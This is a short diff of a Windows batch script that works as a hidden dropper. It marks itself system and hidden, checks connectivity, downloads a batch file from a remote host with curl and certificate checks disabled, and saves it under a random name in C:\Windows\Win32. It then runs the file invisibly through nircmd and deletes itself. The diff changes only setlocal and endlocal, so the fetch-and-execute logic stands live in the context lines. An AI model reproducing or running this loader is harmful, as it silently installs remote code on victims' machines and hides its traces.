@@ -1,5 +1,4 @@
 @echo off
-setlocal
 attrib +s +h +i "%~f0"
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
@@ -40,5 +39,4 @@ set "win32=%random%"
 curl.exe -k %proxy% %host%/win32.bat --output "C:\Windows\Win32\%win32%.bat" && attrib +s +h +i "C:\Windows\Win32\%win32%.bat"
 timeout -t 300
 nircmd exec hide "C:\Windows\Win32\%win32%.bat"
-endlocal
 DEL /s /f /q /a "%~f0"
